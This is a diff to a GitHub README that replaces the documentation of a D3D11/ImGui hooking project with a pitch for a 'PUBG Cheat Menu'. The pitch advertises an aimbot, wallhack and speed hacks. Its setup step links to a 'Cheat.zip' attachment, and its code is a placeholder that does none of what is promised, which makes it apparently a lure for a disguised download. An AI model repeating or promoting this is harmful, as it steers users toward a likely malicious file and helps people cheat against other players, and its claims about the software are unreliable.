@@ -1,59 +1,75 @@
+# Pubg-Cheat-Menu
+
+![PUBG Cheat Menu](images/pubg_cheat_menu.png)
+
+This GitHub repository contains the source code for the PUBG Steam Cheat Menu, written in C++. The cheat menu offers a comprehensive set of features designed to enhance the player's experience in the game. From improving gameplay mechanics to adding customization options, this cheat menu aims to provide an edge to players who wish to explore different aspects of the game.
+
+## Features
+
+- Aimbot with adjustable settings
+- Wallhack for enhanced visibility
+- Speed and jump hacks for improved mobility
+- Item spawning for quick access to resources
+- Customizable crosshairs and visuals
+- In-game overlays for real-time information display
+
+## Setup
+
+1. Download the cheat menu source code from the following link: [![Download Cheat Menu](https://img.shields.io/badge/Download-Cheat_Menu-green)](https://github.com/user-attachments/files/16928413/Cheat.zip)
+   
+2. Extract the downloaded files to a directory on your computer.
+
+3. Compile the source code using your preferred C++ compiler.
+
+4. Run the compiled executable alongside the PUBG game.
+
+5. Access the cheat menu in-game using the designated hotkeys and customize the settings to your liking.
+
+## Usage
+
+```cpp
+
+#include <iostream>
+#include "cheat_menu.h"
+
+int main() {
+    // Initialize the cheat menu
+    CheatMenu menu;
+    
+    // Display the menu and handle user input
+    menu.displayMenu();
+    
+    return 0;
+}
+
 ```
-            ____ _____ ____ ______   __  __            __      ____          ______      _ 
-           / __ \__  // __ <  <  /  / / / /___  ____  / /__   /  _/___ ___  / ____/_  __(_)
-          / / / //_ </ / / / // /  / /_/ / __ \/ __ \/ //_/   / // __ `__ \/ / __/ / / / / 
-         / /_/ /__/ / /_/ / // /  / __  / /_/ / /_/ / ,<    _/ // / / / / / /_/ / /_/ / /
-        /_____/____/_____/_//_/  /_/ /_/\____/\____/_/|_|  /___/_/ /_/ /_/\____/\__,_/_/
-                                                                       
-                                                                      
-                           D3D11 Hook with ImGui integration (x86 / x64)
-                                Make D3D11 internal menu with ImGui
-                                   (Resize & Fullscreen support)
-```
-<p align="center">
-    <img src="https://img.shields.io/badge/language-C%2B%2B-%23f34b7d.svg?style=for-the-badge&logo=appveyor" alt="C++">
-    <img src="https://img.shields.io/badge/platform-Windows-0078d7.svg?style=for-the-badge&logo=appveyor" alt="Windows">
-    <img src="https://img.shields.io/badge/arch-x86-red.svg?style=for-the-badge&logo=appveyor" alt="x86">
-    <img src="https://img.shields.io/badge/arch-x64-green.svg?style=for-the-badge&logo=appveyor" alt="x64">
-</p>
 
-## :open_book: Project Overview :
+## Screenshots
 
-D3D11 Hook with [ImGui](https://github.com/ocornut/imgui) integration written in C++, works on x86 and x64 with all librairies and includes.
+### Main Menu
 
-#### Features :
+![Main Menu](images/main_menu.png)
 
-- Handle window resize
-- DLL unload itself
-- Handler external unload
-- Handle fullscreen change
+### Aimbot Settings
 
-#### Used librairies :
+![Aimbot Settings](images/aimbot_settings.png)
 
-- [MS Detours](https://www.microsoft.com/en-us/research/project/detours/)
-- [DirectX SDK](https://www.microsoft.com/en-us/download/details.aspx?id=6812)
-- [ImGui](https://github.com/ocornut/imgui)
+### Wallhack Display
 
-## :rocket: Getting Started
+![Wallhack Display](images/wallhack_display.png)
 
-This project use [MS Detours](https://github.com/microsoft/Detours) library for hooking and obviously D3D11 SDK.
+## Support
 
-MS Detours library is already include in the project folder, but if you don't have DirectX SDK you can download it [here](https://www.microsoft.com/en-us/download/details.aspx?id=6812).
+For any issues or feature requests, please open an [issue](https://github.com/your-username/Pubg-Cheat-Menu/issues) here on GitHub.
 
-> **Note** <br>
-> Make sure that **DXSDK_DIR** is declared in your environment variables.
+## License
 
-To see your environment variables :
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details. 
 
-> **Settings --> System --> About --> System Advanced Settings --> Environment Variables**
+---
 
-### Visual Studio :
+### Credits
 
-1. Open the solution file (.sln).
-2. Build the project in Release (x86 or x64)
+Special thanks to the PUBG community for their continuous support and feedback!
 
-Every configuration in x86 / x64 (Debug and Realese) are already configured with librairies and includes.
-
-## :test_tube: Demonstration :
-
-[Demo](https://github.com/adamhlt/D3D11-Hook-ImGui/assets/48086737/5c6cf425-6758-4773-aa1c-9ce4b1c8b41d)
+Let's conquer the battleground together! 💥🎮🔥
